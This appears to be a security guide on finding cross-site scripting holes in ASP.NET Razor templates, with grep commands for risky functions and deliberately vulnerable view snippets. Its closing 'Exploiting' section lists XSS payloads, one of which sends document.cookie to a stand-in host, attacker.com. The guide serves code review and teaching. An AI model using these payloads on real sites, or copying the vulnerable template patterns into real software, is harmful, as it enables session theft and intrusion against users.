# .NET_Razor

🔥 Common XSS causes in .NET (Razor) 🔥

A common way to return dynamic content to the web application user is by using HTML templates. Most applications built with ASP.NET model-view-controller (MVC) framework rely on such functionality heavily because .NET offers a convenient templating engine called Razor. However, there are caveats to using some of its functions, and if the developer doesn’t know them, it is very easy to introduce an XSS or an HTML injection! 

In this post we list common ways of misusing such functionality in C#, and explain how to look for them. In HTML templates, special tags are used as placeholders to describe how the page should look. When a template is rendered, tags are replaced with the real data. Before returning the page to the user, the templating engine substitutes placeholders with real data, and escapes it so as not to break the markup. However, sometimes it is tempting to disable automatic escaping because the text returned from the database may contain HTML that the developers want to preserve. Naturally, if user-controlled data is not escaped, this leads to numerous vulnerabilities.

To find such misconfigurations:

1. Look for the @Html.Raw function usages within the Views folder:
```
𝚐𝚛𝚎𝚙 -𝙷𝚊𝚗𝚛𝙴 "\\@𝙷𝚝𝚖𝚕\\.𝚁𝚊𝚠\\("
```
2. Look for the HtmlString function usages:
```
𝚐𝚛𝚎𝚙 -𝙷𝚊𝚗𝚛𝙴 "𝙷𝚝𝚖𝚕𝚂𝚝𝚛𝚒𝚗𝚐\("
```
3. Look for the document.write JS function usages:
```
𝚐𝚛𝚎𝚙 -𝙷𝚊𝚗𝚛𝙴 "𝚍𝚘𝚌𝚞𝚖𝚎𝚗𝚝\.𝚠𝚛𝚒𝚝𝚎\("
```
4. Look for the API endpoints which return the "text/html" and "image/svg+xml" content-types, they can be declared as vulnerable because there is a context for a XSS: 
```
𝚐𝚛𝚎𝚙 -𝙷𝚊𝚗𝚛𝙴 "𝚝𝚎𝚡𝚝/𝚑𝚝𝚖𝚕|𝚒𝚖𝚊𝚐𝚎/𝚜𝚟𝚐+𝚡𝚖𝚕"
```
5. Check all HTML tag attributes without quotes around template attribute values. This tip will work even when HTML escaping is on! 
```
<𝚒𝚖𝚐 𝚜𝚛𝚌=@𝚄𝚜𝚎𝚛𝙸𝚗𝚙𝚞𝚝>
```
Here Razor will HTML-encode quotes and angular brackets ('"<>), but not spaces! Since HTML is liberal about (not) using quotes in tags, in this example an attacker can easily add new attributes separated by spaces, and sometimes it is just enough for exploitation (e.g. <𝚒𝚖𝚐 𝚜𝚛𝚌=𝚡 𝚘𝚗𝚎𝚛𝚛𝚘𝚛=𝚙𝚛𝚒𝚗𝚝()>). 

6. Look for user-controlled data that is directly concatenated into script tags, event attributes, or dynamic URLs in anchor tags, without proper escaping or validation.

```
<script>
    var searchQuery = "@Model.SearchQuery";
    // ...
</script>
<a href="/search?q=@Model.SearchQuery">Search for "@Model.SearchQuery"</a>
```

7. Check for dynamic content that is being rendered without proper encoding, such as user-controlled data in attributes or the text of the HTML element itself.

```
<div>@Model.UserInput</div>
<input type="text" value="@Model.UserInput">
```

8. Look for places where user-controlled data is being used to build dynamic JavaScript code, particularly when it is being used to build an object literal.
```
<script>
    var obj = {
        name: "@Model.UserName",
        age: @Model.UserAge
    };
    // ...
</script>
```

9. Check for places where user-controlled data is being used to build dynamic CSS code, particularly when it is being used to build a style attribute.
```
<div style="background-color: @Model.BackgroundColor;"></div>
```

10. Look for places where user-controlled data is being used to build dynamic HTML comments.
```
<!-- User's comment: @Model.UserComment -->
```

# Exploiting

- Query to exploit @Html.Raw vulnerability, if the code includes the following line:
Code example: @Html.Raw(Model.Name)
```
<script>alert('XSS attack');</script>
```
- Query to exploit HtmlString vulnerability:
Code example: @HtmlString("<img src='" + imageUrl + "'>")
```
<img src="javascript:alert('XSS attack')">
```
- Query to exploit document.write vulnerability:
Code example: <script>document.write("<p>" + userContent + "</p>");</script>
```
<script>document.write("<img src='http://attacker.com/steal-cookie.php?cookie=" + document.cookie + "'>");</script>
```
- Query to exploit "text/html" and "image/svg+xml" content-type vulnerabilities:
If the code includes an API endpoint that returns an SVG image and/or other content in that format, you can inject the code above as SVG image content and/or other content to attack.
```
<svg onload=alert('XSS attack')>
```
Query to exploit attribute value without quotes vulnerability:
<img src=@imageUrl>
```
<𝚒𝚖𝚐 𝚜𝚛𝚌=𝚡 𝚘𝚗𝚎𝚛𝚛𝚘𝚛=𝚙𝚛𝚒𝚗𝚝()>
```
